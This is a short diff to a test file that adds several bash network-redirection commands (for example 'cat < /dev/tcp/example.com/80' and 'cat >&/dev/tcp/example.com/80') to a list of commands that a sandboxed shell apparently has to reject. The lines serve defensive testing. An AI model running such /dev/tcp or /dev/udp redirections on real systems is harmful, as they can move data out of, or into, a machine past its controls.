@@ -329,6 +329,11 @@ def test_the_lineage_shell_allows_the_delegation_path_and_reads(command, tmp_pat
         "cat a > {W}/a",
         "echo x > relative.txt",
         "echo x > /dev/tcp/example.com/80",
+        "cat < /dev/tcp/example.com/80",
+        "cat 0</dev/udp/example.com/53",
+        "grep x <> /dev/tcp/example.com/80",
+        "cat <<< x < //dev/tcp/example.com/80",
+        "cat >&/dev/tcp/example.com/80",
         "echo x >&{W}/a",
     ],
 )
